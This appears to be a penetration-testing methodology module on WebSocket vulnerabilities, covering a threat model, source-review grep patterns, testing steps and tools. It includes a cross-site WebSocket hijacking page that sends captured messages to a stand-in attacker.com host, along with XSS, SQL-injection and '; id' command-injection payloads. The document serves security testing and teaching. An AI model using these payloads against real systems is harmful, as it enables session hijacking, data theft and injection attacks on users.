# VULN MODULE — WebSocket Vulnerabilities
# Asset: webapp
# CWE-345 / CWE-79 | Report prefix: WEB-WS

## THREAT MODEL

WebSockets maintain persistent bidirectional connections. Unlike HTTP,
they are established via an HTTP upgrade and then bypass many HTTP-level
security controls. Attack surface:
- Cross-Site WebSocket Hijacking (CSWSH) — CSRF for WebSockets
- Injection via WebSocket messages (XSS, SQLi, command injection)
- Missing authentication on WebSocket endpoint
- Sensitive data exposure over unencrypted ws:// connection

## WHITEBOX PATTERNS

```bash
grep -rn "WebSocket\|ws\.on\|socket\.on\|io\.on\|new WebSocket\b" \
  --include="*.js" --include="*.ts" --include="*.py"

# Origin validation (or lack thereof)
grep -rn "origin\b" --include="*.js" --include="*.py" -A3 | \
  grep -i "websocket\|ws\b\|upgrade"

# Auth check on WebSocket upgrade
grep -rn "upgrade.*request\|on.*connection\|on.*open" \
  --include="*.js" --include="*.py" -A10 | \
  grep -i "auth\|token\|session\|cookie"

# Message handlers — injection sinks
grep -rn "on.*message\|message.*event\b" --include="*.js" -A10 | \
  grep -i "exec\|query\|innerHTML\|eval\|system"
```

## TESTING

### 1. Detect WebSocket endpoints
```bash
# From browser DevTools: Network tab → WS filter
# From source: grep for ws:// or wss:// in JS
grep -r "ws://\|wss://" . --include="*.js" | grep -v "node_modules"

# Burp Suite: Proxy → WebSockets history tab
```

### 2. Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- If WebSocket uses cookie-based auth with no Origin check: -->
<!-- Attacker page: -->
<!DOCTYPE html>
<html>
<body>
<script>
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = () => {
  ws.send('{"type":"getHistory","room":"admin"}');
};
ws.onmessage = (e) => {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
};
</script>
</body>
</html>
```

### 3. WebSocket injection
```bash
# In Burp: intercept WebSocket messages → modify and forward
# Test injection in message fields:
{"message": "<img src=x onerror=alert(document.domain)>"}
{"query": "' OR 1=1--"}
{"cmd": "; id"}
```

### 4. ws:// (unencrypted) detection
```bash
# Check if WebSocket uses ws:// instead of wss://
curl -s https://target.com | grep -o "ws://[^\"']*"
# Any ws:// in production = credential theft over network
```

## TOOLS

```bash
# wscat — WebSocket CLI client
npm install -g wscat
wscat -c wss://target.com/ws -H "Cookie: session=VALID"
# Then send messages interactively

# Burp Suite — WebSocket support built-in (Pro)
# Intercept, replay, fuzz WebSocket messages

# WebSocket King (browser extension)
```
